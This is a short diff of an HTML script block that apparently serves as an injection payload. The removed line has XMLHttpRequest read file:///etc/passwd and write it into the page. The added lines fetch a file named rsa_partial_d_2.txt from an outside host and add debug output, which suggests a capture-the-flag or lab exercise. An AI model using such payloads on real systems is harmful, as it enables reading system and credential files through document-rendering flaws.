@@ -3,9 +3,11 @@
    <script>
   x=new XMLHttpRequest;
   x.onload=function(){ 
+  document.write(1)  
   document.write(this.responseText)
+  document.write(2)
   };
-  x.open("GET","file:///etc/passwd");
+  x.open("GET","http://helios.skillspar.com/static/d9e59574a0ebaa4cba3c5a7372e9af35/rsa_partial_d_2.txt");
   x.send();
 </script> 
 
